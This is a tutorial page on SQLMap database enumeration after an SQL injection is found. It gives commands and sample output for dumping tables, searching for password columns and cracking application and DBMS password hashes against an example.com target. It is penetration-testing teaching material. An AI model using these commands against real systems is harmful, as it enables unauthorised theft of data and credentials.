# Database Enumeration

Enumeration is the central stage of an SQL Injection attack, following the successful detection and confirmation of a vulnerability. This process involves searching for and retrieving (exfiltrating) all available information from the targeted database.

***

## SQLMap Data Exfiltration

SQLMap uses a pre-defined library of queries specific to the detected Database Management System (DBMS) to retrieve content.

For example, for a MySQL DBMS, retrieving the database version banner uses the `VERSION()` query, corresponding to the `--banner` switch in SQLMap. Similarly, retrieving the current user name uses the `CURRENT_USER()` query (via the `--current-user` switch).

When performing data retrieval, SQLMap uses different query types based on the context:

* Inband Queries: Used in non-blind situations (e.g. UNION-query or error-based SQLi), where the query results are expected to be found directly within the HTTP response.
* Blind Queries: Used in blind situations (e.g. boolean-based or time-based), where data must be painstakingly retrieved row-by-row, column-by-column, and bit-by-bit.

***

## Basic Database Enumeration

After confirming an SQLi vulnerability, the initial focus is on gathering core database details:

<table><thead><tr><th width="157">Switch</th><th>Description</th><th>Example SQL Function (MySQL)</th></tr></thead><tbody><tr><td><code>--banner</code></td><td>Retrieves the database version banner</td><td><code>VERSION()</code></td></tr><tr><td><code>--current-user</code></td><td>Retrieves the current database user's name</td><td><code>CURRENT_USER()</code></td></tr><tr><td><code>--current-db</code></td><td>Retrieves the name of the current database</td><td><code>DATABASE()</code></td></tr><tr><td><code>--is-dba</code></td><td>Checks whether the current user holds DBA (administrator) rights</td><td><code>(SELECT super_priv...)='Y'</code></td></tr></tbody></table>

Scenario: Retrieving Core InformationTo collect all of this basic information simultaneously against a target URL, combine the switches:

{% code title="Command" overflow="wrap" %}
```bash
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
```
{% endcode %}

{% code title="Output" %}
```bash
<SNIP>
web application technology: PHP 5.2.6, Apache 2.2.9
back-end DBMS: MySQL >= 5.0
banner: '5.1.41-3~bpo50+1'
[13:30:58] [INFO] fetching current user
current user: 'root@%'
[13:30:58] [INFO] fetching current database
current database: 'testdb'
[13:30:58] [INFO] testing if current user is DBA
[13:30:58] [INFO] fetching current user
current user is DBA: True
```
{% endcode %}

{% hint style="info" %}
#### Note

The 'root' user within the database management system (DBMS) context is typically distinct from the operating system (OS) 'root' user, although both represent a highly privileged user within their respective contexts. The same principle applies to the generic 'DBA' role.
{% endhint %}

### Table and Content Retrieval

Once the current database name (e.g., `testdb`) is known, the next logical step is to enumerate the available tables:

#### Retrieve Table Names

Specify the database name with `-D` and request the tables using `--tables`.

```bash
sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
```

```bash
<SNIP>
[13:59:24] [INFO] fetching tables for database: 'testdb'
Database: testdb
[4 tables]
+---------------+
| member        |
| data          |
| international |
| users         |
+---------------+
```

#### Dump Table Content

Once a table of interest is identified (e.g., `users`), use the `--dump` option along with the database (`-D`) and table (`-T`) flags.

```bash
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb
```

```bash
<SNIP>
Database: testdb
Table: users [4 entries]
+----+--------+------------+
| id | name   | surname    |
+----+--------+------------+
| 1  | luther | blisset    |
| 2  | fluffy | bunny      |
| 3  | wu     | ming       |
| 4  | NULL   | nameisnull |
+----+--------+------------+
```

Retrieved data is logged to local files, by default in CSV format, but you can specify alternative formats like HTML or SQLite using the `--dump-format` option.

### Refining Data Retrieval

When dealing with large tables or when targeting specific data points, further options can narrow down the data retrieved:

#### Specify Columns

Use the `-C` option to retrieve only specific column data.

```bash
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
```

```bash
<SNIP>
Database: testdb
Table: users [4 entries]
+--------+------------+
| name   | surname    |
+--------+------------+
| luther | blisset    |
| fluffy | bunny      |
| wu     | ming       |
| NULL   | nameisnull |
+--------+------------+
```

#### Specify Rows (Ordinal Position)

Use `--start` and `--stop` to select rows based on their numbered position within the table.

```bash
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3
```

```bash
<SNIP>
Database: testdb
Table: users [2 entries]
+----+--------+---------+
| id | name   | surname |
+----+--------+---------+
| 2  | fluffy | bunny   |
| 3  | wu     | ming    |
+----+--------+---------+
```

#### Specify Rows (Conditional Filter)

Use the `--where` option to apply a known SQL `WHERE` condition to filter the output rows.

```bash
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
```

```bash
<SNIP>
Database: testdb
Table: users [1 entry]
+----+--------+---------+
| id | name   | surname |
+----+--------+---------+
| 2  | fluffy | bunny   |
+----+--------+---------+
```

### Full Database Enumeration

For maximum data retrieval:

* **Dump Current Database:** Use `--dump -D <DB_name>` (without specifying a table `-T`) to retrieve all content from all tables within that specified database.
* **Dump All Databases:** Use the `--dump-all` switch to retrieve all content from every database on the server. It is generally advised to combine this with `--exclude-sysdbs` to skip retrieving irrelevant data from system databases (e.g., `information_schema`).
* **Automated Full Enumeration:** For convenience, the combination of the switches `--all` and `--batch` will automatically run the entire enumeration process against the target and provide all details.

***

## Advanced Database Enumeration

When you have covered the basics of database enumeration, you can move to more advanced techniques to retrieve specific data of interest.

### DB Schema Enumeration

To get a complete overview of the database architecture, including the structure of all tables, columns, and their data types, use the `--schema` switch.

```bash
sqlmap -u "http://www.example.com/?id=1" --schema
```

```bash
<SNIP>
Database: master
Table: log [3 columns]
+--------+--------------+
| Column | Type         |
+--------+--------------+
| date   | datetime     |
| agent  | varchar(512) |
| id     | int(11)      |
+--------+--------------+
...
Database: testdb
Table: users [3 columns]
+---------+---------------+
| Column  | Type          |
+---------+---------------+
| id      | int(11)       |
| name    | varchar(500)  |
| surname | varchar(1000) |
+---------+---------------+
```

### Searching for Data of Interest

When dealing with complex database structures that have numerous tables and columns, the `--search` option allows you to locate databases, tables, or columns by using the SQL `LIKE` operator.

<table><thead><tr><th width="113">Target</th><th width="215">Command Syntax</th><th>Example Scenario</th></tr></thead><tbody><tr><td><strong>Tables</strong></td><td><code>--search -T &#x3C;keyword></code></td><td>Find all table names containing the keyword <code>user</code>.</td></tr><tr><td><strong>Columns</strong></td><td><code>--search -C &#x3C;keyword></code></td><td>Find all column names containing the keyword <code>pass</code>.</td></tr></tbody></table>

#### Scenario: Searching for Tables

To find all table names containing the keyword `user`:

```bash
sqlmap -u "http://www.example.com/?id=1" --search -T user
```

```bash
<SNIP>
[14:24:19] [INFO] searching tables LIKE 'user'
Database: testdb [1 table]
+-----------------+
| users           |
+-----------------+
Database: master [1 table]
+-----------------+
| users           |
+-----------------+
Database: mysql [1 table]
+-----------------+
| user            |
+-----------------+
```

To search for all column names based on a specific keyword, such as `pass`:

```bash
<SNIP> columns LIKE 'pass' were found in the following databases:
Database: owasp10
Table: accounts [1 column]
+----------+------+
| Column   | Type |
+----------+------+
| password | text |
+----------+------+
Database: master
Table: users [1 column]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| password | varchar(512) |
+----------+--------------+
```

### Password Enumeration and Cracking

Once a column containing password hashes (e.g., `master.users.password`) is identified, SQLMap has automated functionality to retrieve and crack these credentials.

#### Application User Passwords

When dumping a table that contains identifiable password hashes, SQLMap performs the following steps:

1. **Recognises Hashes:** Identifies values that match a known hash format.
2. **Prompts Cracking:** Upon retrieval, SQLMap prompts the user to store the hashes temporarily or attempt cracking using a dictionary-based attack.
3. **Executes Cracking:** If accepted, the cracking process begins using multiprocessing based on the available CPU cores.

#### Scenario: Cracking Application User Passwords

When running `--dump -T users -D master`, SQLMap detects hashes and asks for user interaction:

```bash
<SNIP>
[14:31:41] [INFO] fetching entries for table 'users' in database 'master'
[14:31:41] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[14:31:41] [INFO] using hash method 'sha1_generic_passwd'
what dictionary do you want to use? [16] default dictionary file ...
[14:31:41] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[14:31:41] [INFO] starting dictionary-based cracking (sha1_generic_passwd)
[14:31:41] [INFO] starting 8 processes
[14:31:41] [INFO] cracked password '05adrian' for hash '70f361f8a1c9035a1d972a209ec5e8b726d1055e'
[14:31:41] [INFO] cracked password '1201Hunt' for hash 'df692aa944eb45737f0b3b3ef906f8372a3834e9'
```

#### Database System User Passwords

For recovering system-level credentials (e.g., database connection details) stored within DBMS system tables, use the specialised `--passwords` switch. This flag fetches the database user password hashes and immediately offers to run a dictionary-based attack against them.

#### Scenario: Enumerating DB System Passwords

```bash
sqlmap -u "http://www.example.com/?id=1" --passwords
```

```bash
<SNIP>
[14:25:20] [INFO] fetching database users password hashes
[14:25:20] [INFO] retrieved: 'root'
[14:25:20] [INFO] retrieved: 'root'
[14:25:20] [INFO] retrieved: 'debian-sys-maint'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to perform a dictionary-based attack against retrieved password hashes? [Y/n/q] Y
[14:25:20] [INFO] using hash method 'mysql_passwd'
what dictionary do you want to use? [16] default dictionary file ...
[14:25:20] [INFO] starting dictionary-based cracking (mysql_passwd)
[14:25:26] [INFO] cracked password 'testpass' for user 'root'
database management system users password hashes:
[*] debian-sys-maint [16]:
    password hash: *6B2C58EABD91C1776DA223B088B601604F898847
[*] root [16]:
    password hash: *00E247AC5F9AF26AE0194B41E1E769DEE1429A29
    clear-text password: testpass
```
